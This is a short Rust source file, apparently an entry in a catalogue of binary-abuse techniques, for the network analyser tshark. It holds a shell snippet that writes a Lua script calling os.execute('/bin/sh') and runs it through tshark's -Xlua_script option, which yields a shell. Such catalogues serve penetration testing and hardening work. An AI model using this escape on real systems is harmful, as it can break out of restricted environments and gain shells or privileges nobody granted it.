pub static BIN_NAME: &'static str = "tshark";
pub static BIN_DESC: &'static str = "This program is able to execute `lua` code.";
pub static SH_CODE: &'static str = r#"
    
    TF=$(mktemp)
    echo 'os.execute("/bin/sh")' >$TF
    tshark -Xlua_script:$TF
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code { 
	title: "SH_CODE",
	code: SH_CODE,
	tag: Tag::SH,
};
